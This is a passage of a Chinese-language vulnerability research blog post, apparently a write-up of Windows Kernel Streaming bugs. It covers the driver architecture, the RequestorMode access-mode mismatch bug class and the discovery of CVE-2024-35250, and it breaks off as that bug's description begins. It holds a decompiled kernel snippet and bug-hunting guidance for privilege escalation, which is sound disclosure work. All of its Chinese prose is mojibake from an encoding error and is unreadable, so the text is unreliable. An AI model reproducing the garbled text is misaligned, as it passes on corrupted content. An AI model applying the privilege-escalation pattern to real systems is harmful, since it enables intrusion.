&lt;p&gt;é€™é‚Šå°±ç”¨å€‹ç°¡å–®çš„ç¯„ä¾‹ä¾†ä»‹ç´¹ä¸€ä¸‹ Application å¦‚ä½•å¾è¦–è¨Šé¡é ­è®€å–è³‡æ–™&lt;/p&gt;

&lt;p&gt;å…¶æœ€ç°¡å–®çš„æµç¨‹å¤§æ¦‚å¦‚é€™å¼µåœ–æ‰€ç¤º :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;é–‹å•Ÿè¨­å‚™å¾Œç²å¾—è¨­å‚™ Handle&lt;/li&gt;
  &lt;li&gt;ä½¿ç”¨é€™å€‹ Handle åœ¨é€™å€‹ Filter ä¸Šå»ºç«‹ Pin çš„ Instance ä¸¦ç²å¾— Pin handle&lt;/li&gt;
  &lt;li&gt;ä½¿ç”¨ IOCTL_KS_PROPERTY è¨­ç½® Pin çš„ç‹€æ…‹åˆ° RUN&lt;/li&gt;
  &lt;li&gt;æœ€å¾Œå°±å¯ä»¥ä½¿ç”¨ &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ks/ni-ks-ioctl_ks_read_stream&quot;&gt;IOCTL_KS_READ_STREAM&lt;/a&gt; å¾é€™å€‹ Pin ä¸­è®€è³‡æ–™é€²ä¾†&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;kernel-streaming-architecture&quot;&gt;Kernel Streaming architecture&lt;/h2&gt;
&lt;blockquote&gt;
  &lt;p&gt;å°æ¼æ´ç ”ç©¶è€Œè¨€ï¼Œæˆ‘å€‘å¿…é ˆå…ˆäº†è§£å…¶æ¶æ§‹ï¼Œæ€è€ƒæœ‰å“ªäº›å¯èƒ½çš„æ”»æ“Šé¢&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;åœ¨åˆæ­¥äº†è§£ Kernel Streaming æœ‰å“ªäº›åŠŸèƒ½å’Œæ“ä½œå¾Œï¼Œç‚ºäº†æ‰¾å°‹æ¼æ´å¿…é ˆå…ˆäº†è§£ä¸€ä¸‹æ¶æ§‹ï¼Œäº†è§£ Windows æ˜¯æ€éº¼å¯¦ä½œé€™äº›åŠŸèƒ½ã€åˆ†åˆ¥æœ‰å“ªäº›å…ƒä»¶ç­‰ç­‰ï¼Œæ‰çŸ¥é“æ‡‰è©²è¦åˆ†æå“ªäº› sysï¼Œå¾å“ªé‚Šä¸‹æ‰‹æœƒæ¯”è¼ƒå¥½ã€‚&lt;/p&gt;

&lt;p&gt;ç¶“éæˆ‘å€‘åˆ†æå¾Œï¼Œæ•´å€‹æ¶æ§‹ç´„ç•¥æœƒåƒé€™å¼µåœ–æ‰€ç¤º :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨ Kernel Stearming å…ƒä»¶ä¸­ï¼Œæœ€ç‚ºæ ¸å¿ƒçš„å°±æ˜¯ ksthunk.sys åŠ ks.sysï¼Œå¹¾ä¹æ‰€æœ‰åŠŸèƒ½éƒ½æœƒèˆ‡å®ƒå€‘æœ‰é—œã€‚&lt;/p&gt;

&lt;h3 id=&quot;ksthunk-kernel-streaming-wow-thunk-service-driver&quot;&gt;ksthunk (Kernel Streaming WOW Thunk Service Driver)&lt;/h3&gt;
&lt;p&gt;Application å‘¼å« DeviceIoControl å¾Œï¼Œåœ¨ Kernel Streaming ä¸­çš„&lt;strong&gt;å…¥å£é»&lt;/strong&gt;ï¼Œä½†å®ƒåŠŸèƒ½å¾ˆç°¡å–®ï¼Œè² è²¬å°‡ WoW64 process ä¸­ 32-bit çš„ requests è½‰æ›æˆ 64-bit çš„ requestsï¼Œä½¿å¾—ä¸‹å±¤çš„ driver å°±å¯ä»¥ä¸å¿…ç‚º 32 ä½å…ƒçš„çµæ§‹å¦å¤–è™•ç†ã€‚&lt;/p&gt;

&lt;h3 id=&quot;ks-kernel-connection-and-streaming-architecture-library&quot;&gt;ks (Kernel Connection and Streaming Architecture Library)&lt;/h3&gt;
&lt;p&gt;Kernel Streaming çš„&lt;strong&gt;æ ¸å¿ƒå…ƒä»¶&lt;/strong&gt;ä¹‹ä¸€ï¼Œå®ƒæ˜¯ Kernel Streaming çš„å‡½ç¤ºåº«ï¼Œè² è²¬åŠè½‰ç™¼ IOCTL_KS_PROPERTY ç­‰ requests åˆ°å°æ‡‰è¨­å‚™çš„ driver ä¸­ï¼ŒåŒæ™‚ä¹Ÿæœƒè² è²¬è™•ç† AVStream çš„ç›¸é—œåŠŸèƒ½ã€‚&lt;/p&gt;

&lt;h3 id=&quot;the-work-flow-of-ioctl_ks_&quot;&gt;The work flow of IOCTL_KS_*&lt;/h3&gt;
&lt;p&gt;è€Œåœ¨å‘¼å« DeviceIoControl æ™‚ï¼Œå°±æœƒåƒä¸‹åœ–ä¸€æ¨£ï¼Œå°‡ä½¿ç”¨è€…çš„ requests ä¾åºçµ¦ç›¸å°æ‡‰çš„ driver ä¾†è™•ç†&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;è€Œåˆ°ç¬¬ 6 æ­¥æ™‚ ks.sys å°±æœƒæ ¹æ“šä½  requests çš„ &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ksproperty-structure&quot;&gt;Property&lt;/a&gt; ä¾†æ±ºå®šè¦äº¤çµ¦å“ªå€‹ driver åŠ handler ä¾†è™•ç†ä½ çš„ requestã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æœ€çµ‚å†è½‰ç™¼çµ¦ç›¸å°æ‡‰çš„ Driverï¼Œå¦‚ä¸Šåœ–ä¸­æœ€å¾Œè½‰ç™¼çµ¦ portcls ä¸­çš„ handler ä¾†æ“ä½œéŸ³è¨Šè¨­å‚™ã€‚&lt;/p&gt;

&lt;p&gt;åˆ°é€™é‚Šæ‡‰è©²å° Kernel Streaming çš„æ¶æ§‹åŠæµç¨‹æœ‰åˆæ­¥æ¦‚å¿µäº†ï¼Œæ¥ä¸‹ä¾†å°±æ˜¯æ‰¾æ´çš„æ™‚åˆ»ã€‚ä¾ç…§ç¾æœ‰çš„å…ƒç´ ä¾†çœ‹ï¼Œå“ªäº›æ˜¯å€¼å¾—ä¸€çœ‹çš„æ”»æ“Šé¢å‘¢ï¼Ÿ&lt;/p&gt;

&lt;h3 id=&quot;from-attackers-view&quot;&gt;From attackerâ€™s view&lt;/h3&gt;
&lt;blockquote&gt;
  &lt;p&gt;åœ¨æŒ–æ˜æ¼æ´å‰ï¼Œå¦‚æœèƒ½ä»”ç´°æ€è€ƒæ€æ¨£çš„æƒ…æ³ä¸‹å®¹æ˜“æœ‰æ´ï¼Œå¯ä»¥é”åˆ°äº‹åŠåŠŸå€çš„æ•ˆæœ&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;å¾ä¸€å€‹æ¼æ´ç ”ç©¶å“¡çš„è§’åº¦ä¾†èªªï¼Œå¤§æ¦‚æœƒæœ‰ä¸‹åˆ—é€™å¹¾å€‹é»&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;æ¯å€‹è¨­å‚™ä¸­çš„ Property handler
æ¯å€‹è¨­å‚™ä¸­çš„ KS Object éƒ½æœ‰å„è‡ªçš„ Propertyï¼Œè€Œä¸”æ¯å€‹ Property éƒ½æœ‰å„è‡ªçš„å¯¦ä½œï¼Œæœ‰äº› Property è™•ç†èµ·ä¾†å®¹æ˜“å‡ºå•é¡Œã€‚&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ks åŠ ksthunk 
ks åŠ ksthunk å·²ç¶“æœ‰å¾ˆé•·ä¸€æ®µæ™‚é–“æ²’æœ‰æ¼æ´ï¼Œä½†å»æ˜¯å€‹æœ€å®¹æ˜“æ¥è§¸åˆ°çš„å…¥å£é»ï¼Œä¹Ÿè¨±æ˜¯ä¸€å€‹å¥½ç›®æ¨™ï¼Œä¸Šä¸€æ¬¡å‡ºç¾çš„æ¼æ´æ˜¯åœ¨ 2020 å¹´ &lt;a href=&quot;https://x.com/nghiadt1098&quot;&gt;@nghiadt1098&lt;/a&gt; æ‰€æ‰¾åˆ°çš„å…©å€‹æ¼æ´ &lt;a href=&quot;https://msrc.microsoft.com/update-guide/en-us/vulnerability/CVE-2020-16889&quot;&gt;CVE-2020-16889&lt;/a&gt; åŠ &lt;a href=&quot;https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-17045&quot;&gt;CVE-2020-17045&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;æ¯å€‹ driver éƒ½å„è‡ªè™•ç†ä¸€éƒ¨åˆ†çš„å…§å®¹
åœ¨ Kernel Streaming çš„éƒ¨åˆ†åŠŸèƒ½ä¸­ï¼Œæœ‰äº› driver æœƒå„è‡ªå…ˆè™•ç†éƒ¨åˆ†çš„å…§å®¹ï¼Œå¯èƒ½æœƒé€ æˆä¸€äº›ä¸ä¸€è‡´æ€§çš„å•é¡Œã€‚&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;æˆ‘å€‘é‡å°ä¸Šé¢å¹¾å€‹è§’åº¦å»å°æ•´å€‹ Kernel Streaming åš Code Review å¾Œï¼Œå¾ˆå¿«çš„å°±ç™¼ç¾äº†å¹¾å€‹æ¯”è¼ƒå®¹æ˜“ç™¼ç¾çš„æ¼æ´&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;portcls.sys
    &lt;ul&gt;
      &lt;li&gt;CVE-2024-38055 (out-of-bounds read when set dataformat for Pin)&lt;/li&gt;
      &lt;li&gt;CVE-2024-38056&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ksthunk
    &lt;ul&gt;
      &lt;li&gt;CVE-2024-38054 (out-of-bounds write)&lt;/li&gt;
      &lt;li&gt;CVE-2024-38057&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ä¸éæˆ‘å€‘é€™ä¸€ç¯‡ä¸æœƒä¸€ä¸€è¬›è§£é€™äº›æ¼æ´ï¼Œé€™å¹¾å€‹å¤šæ•¸éƒ½æ˜¯æ²’æœ‰æª¢æŸ¥é•·åº¦æˆ–æ˜¯ index ä¹‹é¡çš„è¶Šç•Œå­˜å–ç­‰ç­‰æ˜é¡¯çš„æ´ï¼Œä¹Ÿè¨±æœƒåœ¨å¾ŒçºŒçš„éƒ¨åˆ†æ…¢æ…¢ä¾†è¬›è§£ï¼Œ&lt;a href=&quot;https://x.com/Fr0st1706&quot;&gt;@Fr0st1706&lt;/a&gt; ä¹Ÿåœ¨å‰é™£å­å¯«å‡ºäº† CVE-2024-38054 çš„&lt;a href=&quot;https://github.com/Black-Frost/windows-learning/tree/main/CVE-2024-38054&quot;&gt;åˆ©ç”¨&lt;/a&gt;ï¼Œé€™é‚Šå°±æš«æ™‚ç•™çµ¦è®€è€…ç ”ç©¶äº†ã€‚&lt;/p&gt;

&lt;p&gt;é€™ç¯‡è¦æçš„æ˜¯ï¼Œæˆ‘å€‘åœ¨ Review éç¨‹ä¸­ç™¼ç¾äº†ä¸€äº›æœ‰è¶£çš„äº‹æƒ…ã€‚&lt;/p&gt;

&lt;p&gt;ä½ è¦ºå¾—ä¸‹é¢é€™æ®µç¨‹å¼ç¢¼æ˜¯å¦å®‰å…¨å‘¢ï¼Ÿ&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;__int64 __fastcall CKSThunkDevice::CheckIrpForStackAdjustmentNative(__int64 a1, struct _IRP *irp, __int64 a3, int *a4)
{

    if ( irp-&amp;gt;RequestorMode )
    {
        v14 = 0xC0000010;
    }
    else
    {
        UserBuffer = (unsigned int *)irp-&amp;gt;UserBuffer;
        ...
        v14 = (*(__int64 (__fastcall **)(_QWORD, _QWORD, __int64 *))    (Type3InputBuffer + 0x38))(// call Type3InputBuffer+0x38
                *UserBuffer,
                0LL,
               v19);
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;çœ‹åˆ°é€™æ®µç¨‹å¼ç¢¼è®“æˆ‘æƒ³èµ·äº† &lt;a href=&quot;https://decoded.avast.io/janvojtesek/lazarus-and-the-fudmodule-rootkit-beyond-byovd-with-an-admin-to-kernel-zero-day/&quot;&gt;CVE-2024-21338&lt;/a&gt;ï¼Œè©²æ¼æ´åŸå…ˆä¸¦æ²’æœ‰ä»»ä½•æª¢æŸ¥ï¼Œè€Œåœ¨ä¿®è£œå¾Œå‰‡æ˜¯æ–°å¢äº† &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/nf-wdm-exgetpreviousmode&quot;&gt;ExGetPreviousMode&lt;/a&gt;ï¼Œä½†é€™é‚Šæª¢æŸ¥å‰‡æ˜¯ä½¿ç”¨äº† &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp&quot;&gt;IRP&lt;/a&gt; ä¸­çš„ RequestorMode ä¾†åšæª¢æŸ¥ï¼Œä¸éä¸€èˆ¬æƒ…æ³ä¸‹å¾ä½¿ç”¨è€…å‘¼å«çš„ IOCTL çš„ RequestorMode éƒ½æœƒæ˜¯ UserMode(1) æ˜¯ä¸æœƒæœ‰å•é¡Œçš„ã€‚&lt;/p&gt;

&lt;p&gt;æ­¤æ™‚æˆ‘åˆæƒ³èµ·ä¾† &lt;a href=&quot;https://x.com/tiraniddo&quot;&gt;James Forshaw&lt;/a&gt; çš„ &lt;a href=&quot;https://googleprojectzero.blogspot.com/2019/03/windows-kernel-logic-bug-class-access.html&quot;&gt;Windows Kernel Logic Bug Class: Access Mode Mismatch in IO Manager&lt;/a&gt; é€™ç¯‡æ–‡ç« ã€‚&lt;/p&gt;

&lt;h2 id=&quot;the-overlooked-bug-class&quot;&gt;The overlooked bug class&lt;/h2&gt;

&lt;p&gt;é€™é‚Šæˆ‘å€‘å¿…é ˆå…ˆä¾†æä¸€ä¸‹å¹¾å€‹åè©è·Ÿæ¦‚å¿µï¼Œä¸éå¦‚æœä½ å° PreviousMode åŠ RequestorMode å¾ˆç†Ÿæ‚‰ï¼Œå¯ä»¥è·³è‡³ &lt;a href=&quot;#A-logical-bug-class&quot;&gt;A logical bug class&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;previousmode&quot;&gt;PreviousMode&lt;/h3&gt;
&lt;p&gt;ç¬¬ä¸€å€‹æ˜¯ PreviousModeï¼Œåœ¨ Application ä¸­å¦‚æœä½¿ç”¨è€…é€é Nt* ç­‰ System Service Call ä¾†å°è¨­å‚™æˆ–æª”æ¡ˆä¸­æ“ä½œæ™‚ï¼Œé€²å…¥ Kernel å¾Œå°±æœƒåœ¨ &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/kernel/eprocess#ethread&quot;&gt;_ETHREAD&lt;/a&gt; ä¸­çš„ PreviousMode æ¨™è¨» UserMode(1) è¡¨ç¤ºé€™å€‹ System Service Call æ˜¯ä¾†è‡ª User mode çš„ Applicationã€‚å¦‚æœä½ æ˜¯å¾ Kernel mode ä¸­ï¼Œä¾‹å¦‚è¨­å‚™ driver å‘¼å« Zw* System Service Call çš„ API å°±æœƒæ¨™è¨˜æˆ KernelMode(0)ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;requestormode&quot;&gt;RequestorMode&lt;/h3&gt;
&lt;p&gt;å¦å¤–ä¸€å€‹é¡ä¼¼çš„å‰‡æ˜¯ IRP ä¸­çš„ RequestorMode é€™é‚Šå°±æ˜¯è¨˜éŒ„ä½ åŸå§‹çš„ requests æ˜¯ä¾†è‡ª UserMode é‚„æ˜¯ KernelModeï¼Œåœ¨ Kernel driver ä¸­çš„ç¨‹å¼ç¢¼æ˜¯éå¸¸å¸¸ç”¨åˆ°çš„æ¬„ä½ï¼Œé€šå¸¸æœƒä¾†è‡ª PreviousModeã€‚&lt;/p&gt;

&lt;p&gt;å¾ˆå¸¸è¢«ç”¨ä¾†æ±ºå®šæ˜¯å¦è¦å°ä¾†è‡ªä½¿ç”¨è€…çš„ requests åšé¡å¤–æª¢æŸ¥ï¼Œåƒæ˜¯ Memory Access Check æˆ–æ˜¯ Security Access Checkï¼Œä¾‹å¦‚ä¸‹é¢é€™å€‹ä¾‹å­ä¸­ï¼Œå¦‚æœ requests ä¾†è‡ª UserMode å°±æœƒæª¢æŸ¥ä½¿ç”¨è€…æä¾›çš„ä½ç½®ï¼Œå¦‚æœæ˜¯å¾ Kernel ä¾†çš„ï¼Œå°±ä¸åšé¡å¤–æª¢æŸ¥å¢åŠ æ•ˆç‡ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä½†å¯¦éš›ä¸Šé€™ä¹Ÿå‡ºç¾äº†ä¸€äº›å•é¡Œâ€¦&lt;/p&gt;

&lt;h3 id=&quot;a-logical-bug-class&quot;&gt;A logical bug class&lt;/h3&gt;
&lt;p&gt;åœ¨ &lt;a href=&quot;https://x.com/tiraniddo&quot;&gt;James Forshaw&lt;/a&gt; çš„ &lt;a href=&quot;https://googleprojectzero.blogspot.com/2019/03/windows-kernel-logic-bug-class-access.html&quot;&gt;Windows Kernel Logic Bug Class: Access Mode Mismatch in IO Manager&lt;/a&gt; ä¸­ï¼Œå°±æåˆ°äº†ä¸€ç¨® Bug Class&lt;/p&gt;

&lt;p&gt;é€™é‚Šå¯ä»¥å…ˆæƒ³æƒ³çœ‹ï¼Œä½¿ç”¨è€…å‘¼å« NtDeviceIoControlFile ä¹‹é¡çš„ System Service Call ä¹‹å¾Œï¼Œå¦‚æœè™•ç†çš„ driver åˆå»ç”¨ä½¿ç”¨è€…å¯æ§çš„è³‡æ–™ä¾†ä½œç‚º ZwOpenFile çš„åƒæ•¸ï¼Œæœƒç™¼ç”Ÿä»€éº¼äº‹&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨ driver å‘¼å« ZwOpenFile ä¹‹å¾Œï¼Œ PreviousMode æœƒè½‰æ›æˆç‚º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode&lt;/code&gt;ï¼Œä¸¦ä¸”åœ¨ NtOpenFile è™•ç†æ™‚ï¼Œå°±æœƒå› ç‚º PreviousMode æ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode&lt;/code&gt; çš„é—œä¿‚å°‘æ‰å¤§éƒ¨åˆ†çš„æª¢æŸ¥ï¼Œè€Œå¾ŒçºŒçš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; ä¹Ÿæœƒå› æ­¤è®Šæˆ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode&lt;/code&gt; ï¼Œå¾è€Œç¹é Security Access Check åŠ Memory Access Checkã€‚ä¸éé€™é‚Šå¾ˆçœ‹å¾ŒçºŒè™•ç†çš„ driver æ€éº¼å»å¯¦ä½œé€™äº›æª¢æŸ¥ï¼Œå¦‚æœåªä¾è³´ RequestorMode ä¾†æ±ºå®šè¦ä¸è¦æª¢æŸ¥ï¼Œå°±å¯èƒ½æœƒæœ‰å•é¡Œã€‚é€™é‚Šçœç•¥äº†ä¸€äº›ç´°ç¯€ï¼Œå¯¦éš›ä¸Šçš„ç‹€æ³æœƒç¨å¾®å†è¤‡é›œä¸€é»é»ï¼Œä¹Ÿæœƒè·Ÿ CreateFile çš„ flag æœ‰é—œï¼Œç´°ç¯€å¯åƒè€ƒä¸‹åˆ—å¹¾ç¯‡æ–‡ç«  :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2019/03/windows-kernel-logic-bug-class-access.html&quot;&gt;Windows Kernel Logic Bug Class: Access Mode Mismatch in IO Manager&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2021/01/hunting-for-bugs-in-windows-mini-filter.html&quot;&gt;Hunting for Bugs in Windows Mini-Filter Drivers&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/blog/2019/03/local-privilege-escalation-via-the-windows-i-o-manager-a-variant-finding-collaboration/&quot;&gt;Local privilege escalation via the Windows I/O Manager: a variant finding collaboration&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;é€™é‚Šæœ‰é€™æ¨£çš„æ¦‚å¿µå°±å¥½ï¼ŒåŸå…ˆé€™äº›ç ”ç©¶ä¸»è¦æ˜¯åœ¨ Zw* ç³»åˆ—çš„ System Service Call ä¸Šé¢ï¼Œå¤§å®¶å¯ä»¥æ€è€ƒä¸€ä¸‹ï¼Œæœ‰æ²’æœ‰å…¶ä»–é¡ä¼¼çš„æƒ…æ³ï¼Œä¹Ÿå¯èƒ½é€ æˆé€™ç¨®é‚è¼¯æ¼æ´å‘¢?&lt;/p&gt;

&lt;h4 id=&quot;the-new-bug-pattern&quot;&gt;The new bug pattern&lt;/h4&gt;
&lt;p&gt;äº‹å¯¦ä¸Šä¾†èªªæ˜¯æœ‰çš„ï¼Œä½¿ç”¨ &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iobuilddeviceiocontrolrequest&quot;&gt;IoBuildDeviceIoControlRequest&lt;/a&gt; é€™å€‹æ–¹æ³•å»å‰µå»ºä¸€å€‹ DeviceIoControl çš„ IRP æ™‚ï¼Œè¬ä¸€æ²’æ³¨æ„åˆ°ä¹Ÿå¾ˆå®¹æ˜“æœ‰é€™æ¨£çš„å•é¡Œã€‚é€™å€‹ API ä¸»è¦æ˜¯ Kernel driver ç”¨ä¾†å‘¼å« IOCTL çš„å…¶ä¸­ä¸€ç¨®æ–¹æ³•ï¼Œå®ƒæœƒå¹«ä½ å»ºå¥½ IRPï¼Œè€Œå¾ŒçºŒåœ¨å»å‘¼å« &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/nf-wdm-iofcalldriver&quot;&gt;IofCallDriver&lt;/a&gt;ï¼Œå°±å¯ä»¥åœ¨ Kernel driver ä¸­å‘¼å« IOCTLã€‚åœ¨ &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iobuilddeviceiocontrolrequest&quot;&gt;Microsoft Learn&lt;/a&gt; ä¸­ï¼Œæœ‰ä¸€æ®µè©±ç‰¹åˆ¥å€¼å¾—æ³¨æ„ :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä¹Ÿå°±æ˜¯é è¨­æƒ…æ³ä¸‹ï¼Œå¦‚æœä½ æ²’æœ‰ç‰¹åˆ¥å»è¨­ç½® RequestorMode å°±æœƒç›´æ¥ä»¥ KernelMode å½¢å¼å»å‘¼å« IOCTLã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æŒ‰ç…§é€™å€‹æ€è·¯ï¼Œæˆ‘å€‘é‡æ–°å›é ­å¯©è¦–ä¸€ä¸‹æˆ‘å€‘çš„ç›®æ¨™ Kernel Streamingï¼Œæˆ‘å€‘ç™¼ç¾äº†ä¸€å€‹å¸å¼•æˆ‘å€‘çš„åœ°æ–¹ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨ Kernel Streaming ä¸­ä½¿ç”¨é€™å€‹ IoBuildDeviceIoControlRequest åœ°æ–¹æ˜¯åœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks!KsSynchronousIoControlDevice&lt;/code&gt; ï¼Œè€Œä¸»è¦å…§å®¹æ˜é¡¯å°±æ˜¯åœ¨ç”¨å‰›å‰›æåˆ°çš„æ–¹æ³•ï¼Œåœ¨ Kernel ä¸­å‘¼å« DeviceIoControlï¼Œä¸éé€™é‚Šçœ‹ä¼¼æœ‰å¥½å¥½çš„è¨­ç½® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt;ï¼Œä¸”æœƒæ ¹æ“š KsSynchronousIoControlDevice åƒæ•¸ä¸åŒè€Œå»è¨­ç½®ä¸åŒçš„æ•¸å€¼ï¼Œå°æ–¼é–‹ç™¼è€…ä¾†èªªæœƒæ˜¯ä¸€å€‹æ–¹ä¾¿çš„å‡½å¼åº«ã€‚&lt;/p&gt;

&lt;p&gt;ç„¶è€Œâ€¦&lt;/p&gt;

&lt;p&gt;ks!CKsPin::GetState
&lt;img src=&quot;/assets/img/blog/20240823/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ks!SerializePropertySet
&lt;img src=&quot;/assets/img/blog/20240823/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ks!UnserializePropertySet
&lt;img src=&quot;/assets/img/blog/20240823/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘ç™¼ç¾åˆ°åœ¨ Kernel Streaming ä¸­ï¼Œå…¨éƒ¨æœ‰ä½¿ç”¨åˆ° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsSynchronousIoControlDevice&lt;/code&gt; çš„åœ°æ–¹éƒ½æ˜¯å›ºå®šçš„ä½¿ç”¨ KernelMode(0)ï¼Œåˆ°é€™é‚Šå°±å¯ä»¥ä»”ç´°çš„æª¢æŸ¥çœ‹çœ‹ï¼Œæœ‰ç”¨åˆ°çš„åœ°æ–¹æ˜¯å¦æœ‰å®‰å…¨ä¸Šçš„å•é¡Œäº†ã€‚å› æ­¤æˆ‘å€‘å°‡ Kernel Streaming ä¸­çš„ bug pattern è½‰æ›æˆä¸‹åˆ—å¹¾é»:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;æœ‰ä½¿ç”¨ KsSynchronousIoControlDevice&lt;/li&gt;
  &lt;li&gt;æœ‰å¯æ§çš„
    &lt;ul&gt;
      &lt;li&gt;InputBuffer&lt;/li&gt;
      &lt;li&gt;OutputBuffer&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ç¬¬äºŒæ¬¡è™•ç† IOCTL çš„åœ°æ–¹æœ‰ä¾è³´ RequestorMode åšå®‰å…¨æª¢æŸ¥ï¼Œä¸¦ä¸”æœ‰å¯ä»¥ä½œç‚ºææ¬Šåˆ©ç”¨çš„åœ°æ–¹ã€‚
&lt;img src=&quot;/assets/img/blog/20240823/21.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;æŒ‰ç…§é€™å€‹ Pattern æˆ‘å€‘å¾ˆå¿«åœ°å°±æ‰¾åˆ°äº†ç¬¬ä¸€å€‹æ´&lt;/p&gt;

&lt;h2 id=&quot;the-vulnerability--exploitation&quot;&gt;The vulnerability &amp;amp; exploitation&lt;/h2&gt;

&lt;h3 id=&quot;cve-2024-35250&quot;&gt;CVE-2024-35250&lt;/h3&gt;
&lt;p&gt;é€™å€‹æ¼æ´ä¹Ÿæ˜¯æˆ‘å€‘ä»Šå¹´åœ¨ &lt;a href=&quot;https://x.com/thezdi/status/1770517322203070674&quot;&gt;Pwn2Own Vancouver 2024 ä¸­æ‰€ä½¿ç”¨çš„æ¼æ´&lt;/a&gt;ã€‚åœ¨ Kernel Streaming çš„ IOCTL_KS_PROPERTY åŠŸèƒ½ä¸­ï¼Œç‚ºäº†è®“æ•ˆç‡å¢åŠ ï¼Œæä¾›äº† &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPERTY_TYPE_SERIALIZESET&lt;/code&gt; å’Œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPERTY_TYPE_UNSERIALIZESET&lt;/code&gt; åŠŸèƒ½å…è¨±ä½¿ç”¨è€…é€é&lt;strong&gt;å–®ä¸€å‘¼å«&lt;/strong&gt;èˆ‡å¤šå€‹ Property é€²è¡Œæ“ä½œã€‚ç•¶æˆ‘å€‘ç”¨é€™åŠŸèƒ½æ™‚ï¼Œé€™äº› requests å°‡è¢« KsPropertyHandler å‡½æ•¸åˆ†è§£æˆå¤šå€‹å‘¼å«ï¼Œè©³æƒ…å¯åƒè€ƒ&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ksproperty-structure#remarks&quot;&gt;é€™ç¯‡&lt;/a&gt;ã€‚&lt;/p&gt;

&lt;p&gt;è©²åŠŸèƒ½å¯¦ä½œåœ¨ ks.sys ä¸­&lt;/p&gt;

